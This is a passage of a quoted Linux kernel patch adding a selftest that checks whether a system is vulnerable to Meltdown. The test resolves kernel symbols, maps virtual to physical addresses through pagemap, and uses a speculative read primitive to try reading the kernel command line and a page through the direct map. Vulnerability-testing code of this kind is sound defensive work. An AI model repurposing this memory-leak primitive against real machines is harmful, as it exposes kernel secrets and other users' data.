+> +       struct utsname utsname;
+> +       unsigned long addr;
+> +
+> +       addr = find_symbol_in_file("/proc/kallsyms", name);
+> +       if (addr)
+> +               return addr;
+> +
+> +       if (uname(&utsname) < 0)
+> +               return 0;
+> +       sprintf(systemmap, "/boot/System.map-%s", utsname.release);
+> +       addr = find_symbol_in_file(systemmap, name);
+> +       return addr;
+> +}
+> +
+> +static unsigned long saved_cmdline_addr;
+> +static int spec_fd;
+> +
+> +#define READ_SIZE 32
+> +
+> +static int test_read_saved_command_line(void)
+> +{
+> +       unsigned int i, score = 0, ret;
+> +       unsigned long addr;
+> +       unsigned long size;
+> +       char read[READ_SIZE] = { 0 };
+> +       char expected[READ_SIZE] = { 0 };
+> +       int expected_len;
+> +
+> +       saved_cmdline_addr = find_kernel_symbol("saved_command_line");
+> +       if (!saved_cmdline_addr) {
+> +               printf("[SKIP]\tCan not find symbol saved_command_line\n");
+> +               return 0;
+> +       }
+> +       printf("[INFO]\tsaved_cmdline_addr: 0x%lx\n", saved_cmdline_addr);
+> +
+> +       spec_fd = open("/proc/cmdline", O_RDONLY);
+> +       if (spec_fd == -1) {
+> +               printf("[SKIP]\tCan not open /proc/cmdline\n");
+> +               return 0;
+> +       }
+> +
+> +       expected_len = pread(spec_fd, expected, sizeof(expected), 0);
+> +       if (expected_len < 0) {
+> +               printf("[SKIP]\tCan't read /proc/cmdline\n");
+> +               return 0;
+> +       }
+> +
+> +       /* read address of saved_cmdline_addr */
+> +       addr = saved_cmdline_addr;
+> +       size = sizeof(addr);
+> +       for (i = 0; i < size; i++) {
+> +               ret = readbyte(spec_fd, addr);
+> +               read[i] = ret;
+> +               addr++;
+> +       }
+> +
+> +       /* read value pointed to by saved_cmdline_addr */
+> +       memcpy(&addr, read, sizeof(addr));
+> +       memset(read, 0, sizeof(read));
+> +       printf("[INFO]\tsaved_command_line: 0x%lx\n", addr);
+> +       size = expected_len;
+> +
+> +       if (!addr)
+> +               goto done;
+> +
+> +       for (i = 0; i < size; i++) {
+> +               ret = readbyte(spec_fd, addr);
+> +               read[i] = ret;
+> +               addr++;
+> +       }
+> +
+> +       for (i = 0; i < size; i++)
+> +               if (expected[i] == read[i])
+> +                       score++;
+> +
+> +done:
+> +       if (score > size / 2) {
+> +               printf("[FAIL]\ttest_read_saved_command_line: both high and low kernel mapping leak found.\n");
+> +               ret = -1;
+> +       } else {
+> +               printf("[OK]\ttest_read_saved_command_line: no leak found.\n");
+> +               ret = 0;
+> +       }
+> +
+> +       close(spec_fd);
+> +
+> +       return ret;
+> +}
+> +
+> +static int get_directmap_base(void)
+> +{
+> +       char *buf;
+> +       FILE *fp;
+> +       size_t n;
+> +       int ret;
+> +
+> +       fp = fopen("/sys/kernel/debug/page_tables/kernel", "r");
+> +       if (!fp)
+> +               return -1;
+> +
+> +       buf = NULL;
+> +       ret = -1;
+> +       while (getline(&buf, &n, fp) != -1) {
+> +               if (!strstr(buf, "Kernel Mapping"))
+> +                       continue;
+> +
+> +               if (getline(&buf, &n, fp) != -1 &&
+> +                   sscanf(buf, "0x%lx", &directmap_base) == 1) {
+> +                       printf("[INFO]\tdirectmap_base=0x%lx/0x%lx\n", directmap_base, directmap_base & PUD_MASK);
+> +                       directmap_base &= PUD_MASK;
+> +                       ret = 0;
+> +                       break;
+> +               }
+> +       }
+> +
+> +       fclose(fp);
+> +       free(buf);
+> +       return ret;
+> +}
+> +
+> +static int virt_to_phys(unsigned long virt, unsigned long *phys)
+> +{
+> +       unsigned long pfn;
+> +       uint64_t val;
+> +       int fd, ret;
+> +
+> +       fd = open("/proc/self/pagemap", O_RDONLY);
+> +       if (fd == -1) {
+> +               printf("[INFO]\tFailed to open pagemap\n");
+> +               return -1;
+> +       }
+> +
+> +       ret = pread(fd, &val, sizeof(val), (virt >> PAGE_SHIFT) * sizeof(uint64_t));
+> +       if (ret == -1) {
+> +               printf("[INFO]\tFailed to read pagemap\n");
+> +               goto out;
+> +       }
+> +
+> +       if (!(val & (1ULL << 63))) {
+> +               printf("[INFO]\tPage not present according to pagemap\n");
+> +               ret = -1;
+> +               goto out;
+> +       }
+> +
+> +       pfn = val & ((1ULL << 55) - 1);
+> +       if (pfn == 0) {
+> +               printf("[INFO]\tNeed CAP_SYS_ADMIN to show pfn\n");
+> +               ret = -1;
+> +               goto out;
+> +       }
+> +
+> +       ret = 0;
+> +       *phys = (pfn << PAGE_SHIFT) | (virt & (PAGE_SIZE - 1));
+> +
+> +out:
+> +       close(fd);
+> +       return ret;
+> +}
+> +
+> +static int test_read_local_var(void)
+> +{
+> +       char path[] = "/tmp/meltdown.XXXXXX";
+> +       char string[] = "test string";
+> +       unsigned long phys;
+> +       int i, len, ret;
+> +       char *result;
+> +       void *p;
+> +
+> +       if (get_directmap_base() == -1) {
+> +               printf("[SKIP]\tFailed to get directmap base. Need root and CONFIG_PTDUMP_DEBUGFS\n");
+> +               return 0;
+> +       }
+> +
+> +       spec_fd = mkstemp(path);
+> +       if (spec_fd == -1) {
+> +               printf("[SKIP]\tCan not open %s\n", path);
+> +               return 0;
+> +       }
+> +       ftruncate(spec_fd, 0x1000);
+> +
+> +       p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, spec_fd, 0);
+> +       if (p == MAP_FAILED) {
+> +               printf("[SKIP]\tmmap spec_fd failed\n");
+> +               return 0;
+> +       }
+> +       memcpy(p, string, sizeof(string));
+> +
+> +       if (virt_to_phys((unsigned long)p, &phys) == -1) {
+> +               printf("[SKIP]\tCan not convert virtual address to physical address\n");
+> +               return 0;
+> +       }
+> +
+> +       len = strlen(string);
+> +       result = malloc(len + 1);
+> +       if (!result) {
+> +               printf("[SKIP]\tNot enough memory for malloc\n");
+> +               return 0;
+> +       }
+> +       memset(result, 0, len + 1);
+> +
+> +       for (i = 0; i < len; i++, phys++) {
+> +               result[i] = readbyte(spec_fd, directmap_base + phys);
+> +               if (result[i] == 0)
+> +                       break;
+> +       }
+> +
+> +       ret = !strncmp(string, result, len);
+> +       if (ret)
+> +               printf("[FAIL]\ttest_read_local_var: low kernel mapping leak found.\n");
+> +       else
+> +               printf("[OK]\ttest_read_local_var: no leak found.\n");
+> +
+> +       free(result);
+> +       munmap(p, 0x1000);
+> +       close(spec_fd);
+> +
+> +       return ret;
+> +}
+> +
+> +int main(void)
+> +{
+> +       int ret1, ret2;
+> +
+> +       printf("[RUN]\tTest if system is vulnerable to meltdown\n");
+> +
+> +       set_cache_hit_threshold();
+> +
+> +       memset(target_array, 1, sizeof(target_array));
+> +
+> +       if (set_signal() < 0) {
+> +               printf("[SKIP]\tCan not set handler for segfault\n");
+> +               return 0;
+> +       }
+> +
+> +       ret1 = test_read_local_var();
+> +       ret2 = test_read_saved_command_line();
+> +
+> +       if (ret1 || ret2)
+> +               return -1;
+> +
+> +       return 0;
+> +}
+> --
+> 2.39.0
+>
